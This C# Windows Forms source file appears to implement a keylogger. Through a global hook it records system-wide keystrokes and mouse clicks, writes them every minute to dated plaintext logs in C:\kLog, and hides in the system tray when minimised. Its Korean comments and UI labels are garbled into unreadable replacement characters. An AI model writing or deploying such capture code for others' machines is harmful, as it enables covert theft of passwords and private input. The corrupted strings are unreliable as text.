using Gaten.Net.Windows.Forms;

using System.Text;

namespace Gaten.Data.KeyLogger
{
    public partial class MainForm : Form
    {
        private UserActivityHook hook = new();
        private Thread keyLogThread = default!;
        private bool On = true;
        private string log = string.Empty;

        public MainForm()
        {
            InitializeComponent();
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            hook = new UserActivityHook();
            keyLogThread = new Thread(new ThreadStart(keyLogger));
            keyLogThread.Start();
        }

        private void StartButton_Click(object sender, EventArgs e)
        {
            // Ű�ΰ� �������� ���¸� OFF�� �ϰ�, ��ư ����
            if (On)
            {
                On = false;
                startButton.ForeColor = Color.Black;
                startButton.Text = "����";
                trayIcon.Text = "���� ����";
            }
            // Ű�ΰ� �������� ���¸� ON���� �ϰ�, ��ư ����
            else
            {
                On = true;
                startButton.ForeColor = Color.Red;
                startButton.Text = "����";
                trayIcon.Text = "���� ��";
            }


        }

        private void SaveLog()
        {
            // �α� ������ ��¥���� �����ϱ� ���� ���� ��¥�� ����
            string today = DateTime.Now.ToString("yyyy-MM-dd");
            string fileName = $@"C:\kLog\{today}log.txt";

            if (!Directory.Exists(@"C:\kLog"))
            {
                _ = Directory.CreateDirectory(@"C:\kLog");
            }

            File.AppendAllLines(fileName, new List<string> { DateTime.Now.ToString("yyyy-MM-dd HH:mm") + " " + log }, Encoding.UTF8);

            // ���� �� �α״� ���
            log = string.Empty;
        }

        private void keyLogger()
        {
            // ���콺 ��ŷ
            hook.OnMouseActivity += (sender, e) =>
            {
                if (On)
                {
                    // Ŭ�� �̺�Ʈ�� �߻��ϸ�
                    if (e.Button != MouseButtons.None)
                    {
                        log += $" {e.Button}({e.X},{e.Y})";
                    }
                }
            };

            //Ű���� ��ŷ
            hook.KeyUp += (sender, e) =>
            {
                if (On)
                {
                    log += " " + KeysString(e.KeyCode.ToString());
                }
            };
        }

        public string KeysString(string keyString)
        {
            string toString = keyString switch
            {
                "Capital" => "CapsLock",
                "D0" => "0",
                "D1" => "1",
                "D2" => "2",
                "D3" => "3",
                "D4" => "4",
                "D5" => "5",
                "D6" => "6",
                "D7" => "7",
                "D8" => "8",
                "D9" => "9",
                "Add" => "+",
                "Subtract" => "-",
                "Multiply" => "*",
                "Divide" => "/",
                "Up" => "��",
                "Down" => "��",
                "Left" => "��",
                "Right" => "��",
                "Escape" => "ESC",
                "Oemtilde" => "`",
                "OemMinus" => "-",
                "Oemplus" => "=",
                "Oem5" => "\\",
                "Next" => "PageDown",
                "OemOpenBrackets" => "[",
                "Oem6" => "]",
                "Oem1" => ";",
                "Oem7" => "'",
                "Oemcomma" => ",",
                "OemPeriod" => ".",
                "OemQuestion" => "/",
                "Return" => "Enter",
                "Scroll" => "ScrollLock",
                "LWin" => "Window",
                "HanjaMode" => "Hanja",
                "KanaMode" => "Kana",
                "Decimal" => ".",
                "NumPad0" => "N0",
                "NumPad1" => "N1",
                "NumPad2" => "N2",
                "NumPad3" => "N3",
                "NumPad4" => "N4",
                "NumPad5" => "N5",
                "NumPad6" => "N6",
                "NumPad7" => "N7",
                "NumPad8" => "N8",
                "NumPad9" => "N9",
                _ => keyString,
            };
            return toString;
        }

        private void MainForm_FormClosed(object sender, FormClosedEventArgs e)
        {
            // ���� ��
            SaveLog();

            // Ÿ�̸� ����
            saveTimer.Stop();

            // ������ ����
            keyLogThread.Join();
        }

        private void SaveTimer_Tick(object sender, EventArgs e)
        {
            // 1�и��� �ڵ� ����
            if (DateTime.Now.Second == 0)
            {
                SaveLog();
            }
        }

        private void MainForm_Resize(object sender, EventArgs e)
        {
            if (WindowState == FormWindowState.Minimized)
            {
                Visible = false;
                ShowIcon = false;
                trayIcon.Visible = true;
            }
        }

        private void TrayIcon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            Visible = true;
            ShowIcon = true;
            trayIcon.Visible = false;
            WindowState = FormWindowState.Normal;
        }
    }
}